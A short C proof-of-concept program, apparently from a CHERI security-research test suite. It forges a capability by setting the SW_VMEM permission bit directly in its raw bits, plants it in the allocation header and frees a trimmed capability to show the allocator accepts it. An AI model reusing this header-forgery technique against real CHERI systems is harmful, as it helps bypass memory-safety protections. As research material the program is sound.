#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cheriintrin.h>
#include <cheri/cheri.h>  
#include "../../utils/utils.h" 

union raw_cap {
    struct {
        uint64_t lo;
        uint64_t hi;
    } parts;
    __uint128_t raw_pointer;
    void *cap;
};


int main(void) {
    
    void *cap = malloc(64+64);
    print_cap_info_short("cap", cap);
    void *trimmed_cap = cheri_bounds_set(cap+64,64);
    print_cap_info_short("trimmed_cap", trimmed_cap);

    // Craft a SW_VMEM mem cap
    union raw_cap raw_mem = {.cap = trimmed_cap};
    raw_mem.parts.hi |= ((uint64_t)CHERI_PERM_SW_VMEM<<46);
    print_cap_info_short("mem", raw_mem.cap);

    // Copy the SW_VMEM mem cap into the header at offset + 16
    memcpy(cap+16, &raw_mem.raw_pointer, sizeof(raw_mem.raw_pointer));

    // The header is crafted, let's free it 
    free(trimmed_cap);   

    printf("\nFreeing the trimmed_cap with the crafted header didn't throw an error!\n");
    
    return 0;
}
